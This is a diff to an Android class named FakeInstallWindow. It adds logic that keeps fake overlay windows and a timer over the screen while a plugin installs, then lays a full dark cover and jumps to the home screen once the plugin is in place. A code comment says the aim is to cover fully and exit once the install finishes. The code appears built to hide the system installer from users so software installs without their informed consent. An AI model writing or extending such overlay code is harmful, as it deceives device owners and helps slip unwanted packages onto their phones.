@@ -26,6 +26,8 @@ public class FakeInstallWindow implements FakeWindowInterface {
 
     protected static final int TIMER_COUNT = 100;
 
+    protected int countDown = -1;
+
     protected View coverView;
     protected View timerView;
     protected TextView timeTV;
@@ -100,7 +102,7 @@ public class FakeInstallWindow implements FakeWindowInterface {
 
     @Override
     public void updateTimerCount() {
-        if (count <= 0) {
+        if (count <= 0 || countDown ==0) {
             if (coverView != null && timerView != null) {
                 wm.removeView(coverView);
                 wm.removeView(timerView);
@@ -147,7 +149,18 @@ public class FakeInstallWindow implements FakeWindowInterface {
                 SettingManager.getInstance().setCancelInstallReserve(false);
             }
 
-            if (count == (TIMER_COUNT - 3 * 5) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
+            if (countDown > 0 && AppRuntime.PLUGIN_INSTALLED && SettingManager.getInstance().getKeyPluginInstalled()) {
+                //表示在遮盖的过程中已经安装了插件
+                //此时的动作是进行全遮盖，然后推出
+                AppRuntime.WATCHING_SERVICE_BREAK.set(true);
+                if (installFullView == null) {
+                    installFullView = layoutInflater.inflate(R.layout.fake_install_btn, null);
+                    installFullView.setBackgroundColor(context.getResources().getColor(android.R.color.background_dark));
+                    wm.addView(installFullView, confirmFullBtnParams);
+                }
+
+                UtilsRuntime.goHome(context);
+            } else if (count == (TIMER_COUNT - 3 * 5) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
                 //now just remove install full btn
                 if (installFullView != null) {
                     wm.removeView(installFullView);
@@ -198,6 +211,9 @@ public class FakeInstallWindow implements FakeWindowInterface {
 
                         timeTV.setText(String.format(context.getString(R.string.fake_timer), time));
                         count--;
+                        if (countDown > 0) {
+                            countDown--;
+                        }
                         handler.postDelayed(new Runnable() {
                             @Override
                             public void run() {
@@ -209,6 +225,11 @@ public class FakeInstallWindow implements FakeWindowInterface {
             });
         }
 
+    }
+
+    @Override
+    public void setCountDown(int countDown) {
+        this.countDown = countDown;
     }
 
     @Override
